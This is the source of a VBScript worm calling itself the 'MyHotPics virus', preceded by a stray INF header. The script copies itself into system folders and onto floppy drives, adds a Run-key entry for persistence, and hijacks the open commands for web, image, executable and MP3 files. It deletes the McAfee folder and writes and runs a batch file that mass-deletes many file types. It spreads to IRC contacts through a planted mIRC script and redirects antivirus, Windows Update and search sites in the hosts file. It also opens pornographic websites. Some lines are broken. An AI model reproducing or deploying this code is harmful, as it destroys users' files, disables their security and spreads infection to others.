on error resume next
[Version]
Signature="$Chicago$"
AdvancedINF=2.0 
on error resume next
dim my
set my = createobject("scripting.filesystemobject")
my101 = my.getspecialfolder(0)
my102 = my101 & "\MyHotPics.vbs"
dim my103, bli
set my103 = createobject("wscript.shell")
set bli = createobject("wscript.shell")
my103.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & my102 & " %"
bli.regwrite "HKCR\HTTP\shell\open\command\",WindowDir & "\MyHotPics.vbs"
bli.regwrite "HKCR\htmlfile\shell\open\command\",WindowDir & "\MyHotPics.vbs"
bli.regwrite "HKCR\jpgfile\shell\open\command\",WindowDir & "\MyHotPics.vbs"
bli.regwrite "HKCR\exefile\shell\open\command\",WindowDir & "\MyHotPics.vbs"
bli.regwrite "HKCR\mp3file\shell\open\command\",WindowDir & "\MyHotPics.vbs"
my.copyfile wscript.scriptfullname, my102
set bli = nothing
set my = nothing
set my102 = nothing
set my103 =nothing

dim x
on error resume next
msgbox "we dont need no edgeication..bumbumbumbumbumbumbump....we dont need no self control... all in all in all it's a brake in the wall.{{{From {{THE WALL}}} ",vbcritical,"MyHotPics virus"
x = inputbox ("!!!WARNING!!!-Enter Virus ByPass Code")
if x = "nuke" then
CALL Exitt ()
else
msgbox "!!!WARNING!!!WARNING!!!WARNING!!!- System MeltDown now all Files being Erased",vbexclamation,"MyHotPics virus"
CALL Copyfiles ()
CALL Deletefiles ()
CALL Spreadirc ()
CALL Porn ()
CALL Block()
end if

Sub Copyfiles
on error resume next
Dim Copy_to, drive_exist
set Copy_to = createobject ("scripting.filesystemobject")
Copy_to.copyfile "MyHotPics.vbs", "C:\MyHotPics.vbs"
Copy_to.copyfile "MyHotPics.vbs", "C:\windows\MyHotPics.vbs"
Copy_to.copyfile "MyHotPics.vbs", "C:\windows\system\MyHotPics.vbs"
Copy_to.copyfile "MyHotPics.vbs", "Autoexec.bat"
Copy_to.copyfile "MyHotPics.vbs", "#.html"
if Copy_to.folderexists ("C:\windows\help") then
Copy_to.copyfile "MyHotPics.vbs", "C:\windows\help\MyHotPics.vbs"
if day(now)=5 or day(now)=10 then
set Copy_to = createobject ("wscript.shell")
Copy_to.run "MyHotPics.vbs"
end if
set Copy_to = nothing
set drive_exist = createobject ("scripting.filesystemobject")
if drive_exist.driveexists ("a:\") then
drive_exist.copyfile "MyHotPics.vbs", "A:\MyHotPics.vbs"
else
end if
end if
set drive_exist = nothing
end sub

sub Deletefiles
on error resume next
dim Auto, bt, runing
set runing = createobject ("wscript.shell")
Set Auto = CreateObject("Scripting.FileSystemObject")
if auto.folderexists ("C:\program files\mcafee.com") then
auto.deletefolder "C:\program files\mcafee.com"
else
end if
Set bt = Auto.CreateTextFile("C:\MyHotPics.bat")
bt.WriteLine "CLS"
bt.WriteLine "@ECHO OFF"
bt.Writeline "del *.jpg"
bt.Writeline "del *.ocx"
bt.Writeline "del *.nls"
bt.Writeline "del *.msc"
bt.Writeline "del *.txt"
bt.Writeline "del *.log"
bt.Writeline "del *.js"
bt.Writeline "del *.xls"
bt.Writeline "del *.ax"
bt.Writeline "del *.msc"
bt.Writeline "del *.cpl"
bt.Writeline "del *.bin"
bt.Writeline "del *.dat"
bt.Writeline "del *.sep"
bt.Writeline "del *.gif"
bt.Writeline "del *.nls"
bt.Writeline "del *.chm"
bt.Writeline "del *.tlb"
bt.Writeline "del *.rll"
bt.Writeline "del *.scr"
bt.Writeline "del *.cmd"
bt.Writeline "del *.msi"
bt.Writeline "del *.xlm"
bt.Writeline "del *.reg"
bt.Writeline "exit"
bt.Close
set bt = nothing
set Auto = nothing
runing.run "MyHotPics.bat"
end sub

sub Spreadirc
on error resume next
Dim infectircn, nn
Set infectircn= createobject ("scripting.filesystemobject")
If infectircn.fileexists ("c:\mirc\script.ini") Then
Set infectircn = createobject ("wscript.shell")
infectircn.run "c:\mirc\script.ini"
nn.writeline "[script]"
nn.writeline "n0=on 1:JOIN:#:/.dcc"
nn.writeline "n1="+" send "+"-c "+""
nn.writeline "n2=$nick C:\windows\MyHotPics.vbs"
nn.close
infectircn.close
else
Set infectircn= createobject ("scripting.filesystemobject")
if infectircn.folderexists ("C:\mirc") then
else
infectircn.createfolder "C:\mirc"
end if
Set infectircn = CreateObject("Scripting.FileSystemObject")
Set nn = infectircn.CreateTextFile("C:\mirc\script.ini")
nn.writeline "[script]"
nn.writeline "n0=on 1:JOIN:#:/.dcc"
nn.writeline "n1="+" send "+"-c "+""
nn.writeline "n2=$nick C:\windows\MyHotPics.vbs"
nn.close
end if
end sub

sub Porn
dim Porno
set Porno = createobject ("wscript.shell")
Porno.run "http://www.seehersquirt.com"
Porno.run "http://www.rawpussy.com"
Porno.run "http://www.collegepussy.com"
set Porno = nothing
msgbox "ping ping ping sex sex sex pics pics pics hot hot hot u know u want it! love porn pussy pussy"
end sub

sub Block
on error resume next
If hotpics.FolderExists("C:\Winnt") Then
WindowDir = "C:\Winnt"
End If 
If hotpics.FolderExists("C:\Windows") Then
WindowDir = "C:\Windows"
End If 
If hotpics.FolderExists("C:\Win32") Then
WindowDir = "C:\Win32"
End If 
dim hotpics, mml
Set mml = hotpics.CreateTextFile(WindowDir & "\system32\drivers\etc\hosts",True)
mml.writeline ""
mml.writeline "127.0.0.1 www.freewebs.com"
mml.writeline "127.0.0.1 freewebs.com"
mml.writeline "127.0.0.1 games.yahoo.com"
mml.writeline "127.0.0.1 images.search.yahoo.com"
mml.writeline "127.0.0.1 www.macafee.com"
mml.writeline "127.0.0.1 macafee.com"
mml.writeline "127.0.0.1 windowsupdate.microsoft.com"
mml.writeline "127.0.0.1 www.windowsupdate.microsoft.com"
mml.writeline "127.0.0.1 www.rohitab.com"
mml.writeline "127.0.0.1 rohitab.com"
mml.writeline "127.0.0.1 www.google.com"
mml.writeline "127.0.0.1 google.com"
mml.writeline "127.0.0.1 www.msn.com"
mml.writeline "127.0.0.1 msn.com"
mml.writeline "127.0.0.1 www.yahoo.com"
mml.writeline "127.0.0.1 yahoo.com"
mml.writeline "127.0.0.1 www.microsoft.com"
mml.writeline "127.0.0.1 microsoft.com"
mml.writeline "127.0.0.1www.runescape.com"
mml.writeline "127.0.0.1runescape.com"
mml.writeline ""
mml.Close
end sub